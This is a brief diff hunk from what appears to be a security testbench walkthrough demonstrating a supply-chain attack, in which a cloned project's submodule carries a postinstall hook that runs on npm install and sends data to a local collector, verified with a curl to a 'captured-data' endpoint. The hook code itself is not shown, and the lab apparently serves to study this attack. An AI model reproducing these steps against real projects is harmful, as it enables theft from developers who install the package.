@@ -97,8 +97,8 @@ git -c protocol.file.allow=always clone --recurse-submodules \
     work/awesome-project work/victim-clone
 
 # 3. npm install triggers the REAL postinstall hook from inside the submodule
-export TESTBENCH_MODE=enabled
-npm --prefix work/victim-clone install
+#    ⚠️  TESTBENCH_MODE must be set in the SAME terminal — env vars don't cross sessions
+export TESTBENCH_MODE=enabled && npm --prefix work/victim-clone install
 
 # 4. Verify the capture arrived
 curl -s http://localhost:3000/captured-data
